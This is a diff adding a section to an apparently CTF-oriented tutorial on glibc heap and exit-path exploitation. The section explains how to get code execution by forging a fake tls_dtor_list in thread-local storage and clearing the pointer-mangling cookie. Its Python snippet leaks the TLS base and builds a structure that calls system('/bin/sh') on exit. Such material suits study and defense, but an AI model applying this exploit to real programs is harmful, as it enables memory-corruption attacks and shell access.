@@ -423,3 +423,143 @@ here we write a onegadget as the function handler for '%s'  that will be called 
 
 you can find an example of exploit in `exp_printf_table.py`  file.
 
+------
+
+## 5 - Code execution via TLS-Storage dtor_list overwrite
+
+This one is tricky, but works well. I used it in old ctfs, and almost forgot it 🤖. It uses `__run_exit_handlers()`,
+
+we will forge a fake `tls_dtor_list`. Normally the function pointer in `dtor_list` is mangled, but I gonna show you how to bypass the ptr mangling.
+
+> The prerequisite for this way to achieve code execution, is that the program must exits via `return`, or via `exit()` libc function.
+>
+> In the two cases, libc will execute `__run_exit_handlers()` function that will call any destructors function registered (also called `dtors`), and will cleanup various things before exiting.
+
+let's look at the beginning of `__run_exit_handlers()`:
+
+```c
+/* Call all functions registered with `atexit' and `on_exit',
+   in the reverse of the order in which they were registered
+   perform stdio cleanup, and terminate program execution with STATUS.  */
+void
+attribute_hidden
+__run_exit_handlers (int status, struct exit_function_list **listp,
+                     bool run_list_atexit, bool run_dtors)
+{
+  /* First, call the TLS destructors.  */
+#ifndef SHARED
+  if (&__call_tls_dtors != NULL)
+#endif
+    if (run_dtors)
+      __call_tls_dtors ();
+```
+
+let's follow the code path to `__call_tls_dtors()`: 
+
+(I added the dtor_list structure at beginning for convenience)
+
+```c
+typedef void (*dtor_func) (void *);
+struct dtor_list
+{
+  dtor_func func;
+  void *obj;
+  struct link_map *map;
+  struct dtor_list *next;
+};
+
+....
+....    
+/* Call the destructors.  This is called either when a thread returns from the
+   initial function or when the process exits via the exit function.  */
+void
+__call_tls_dtors (void)
+{
+  while (tls_dtor_list)		// parse the dtor_list chained structures
+    {
+      struct dtor_list *cur = tls_dtor_list;		// cur point to tls-storage dtor_list
+      dtor_func func = cur->func;
+      PTR_DEMANGLE (func);						// demangle the function ptr
+
+      tls_dtor_list = tls_dtor_list->next;		// next dtor_list structure
+      func (cur->obj);					
+
+      /* Ensure that the MAP dereference happens before
+         l_tls_dtor_count decrement.  That way, we protect this access from a
+         potential DSO unload in _dl_close_worker, which happens when
+         l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */
+      atomic_fetch_add_release (&cur->map->l_tls_dtor_count, -1);
+      free (cur);
+    }
+}
+```
+
+`_call_tls_dtors()` parse the linked list of `dtor_list` structures stored in tls-storage.
+
+for each structure found, the `dtor_func func` function is called with `cur->obj`passed as argument.
+
+let's have a look at `tls-storage` , you can dump it with `tls` function in gef bata24 fork;
+
+just after I put the disassembly of `__call_dls_dtor`, as it will help us understanding the calculation of mangled ptr
+
+![tls](./pics/tls.png)
+
+So you can see in red where is the struct `dtor_list` in tls-storage. The line with TLS written is actually the address where points `fs` register.
+
+What is interesting, is that the `PTR_MANGLE cookie` is very near from the structure `dtor_list`, so for example with a memory allocation, or a big enough write, we could overwrite in one chunk, and erase PTR_MANGLE cookie (and also stack canary), and create the struct `dtor_list` at the same time.
+
+interesting point in this method:
+
++  We can clear `PTR_MANGLE cookie` that will economize us the need to leak it first.
+
+- we can control `rdi` register content via the `dtor_list->obj` structure entry that will be passed to the function.
+
++ we can chain multiple `dtor_list` , that will be called sequentially with different arg each time.
+
+depending on libc version tls-storage zone is mapped just before `ld-linux-x86-64.so.2` or sometimes just before `libc.so.6` , so it's easy to locate it in memory with one leak (of libc or ld.so)
+
+as we have set the PTR_MANGLE cookie to zero, the calculation of the function ptr will be simpler
+
+instead of:
+
+```assembly
+   0x00007fc390444dd4 <+36>:	mov    rax,QWORD PTR [rbx]    --> mangled ptr
+   0x00007fc390444dd7 <+39>:	ror    rax,0x11					--> rotate of 17 bits
+   0x00007fc390444ddb <+43>:	xor    rax,QWORD PTR fs:0x30	--> xor with PTR_MANGLE
+```
+
+we will just have to rotate the function ptr by 17 bits left, the xor will be nulled and can be ignored.
+
+you will find a simple example of exploit in the file `exp_tls_dtor_list.py`
+
+the structure forging looks like this:
+
+```python
+stdout = int(rcu('leak: ','\n'),16)
+libc.address = stdout-libc.sym['_IO_2_1_stdout_']
+logbase()
+
+# leak tls base
+tls = u64(readmem(stdout,  libc.address+0x1ff898, 8, 1)) - 0x3c000
+logleak('tls base', tls)
+target = tls + 0x6f0
+logleak('tls target', target)
+system = (libc.sym['system'])<<17
+
+# write fake dtor_list & overwrite canary & PTR_MANGLE
+fake_dtor_list =  p64(target+8)
+fake_dtor_list += p64(system)
+fake_dtor_list += p64(next(libc.search(b'/bin/sh')))
+fake_dtor_list += p64(0)*7
+fake_dtor_list += p64(target+0x50)+p64(target+0x50+0x9a0)+p64(target+0x50)
+fake_dtor_list += p64(0)*4
+# overwrite tls dtor_list
+write(target, fake_dtor_list)
+# exit to shell
+sla('choice> ', '2')
+```
+
+the exploit use stdout readmem macro to leak ld.so base, but depending where your tls-storage is mapped,
+
+a libc leak could be enough..
+
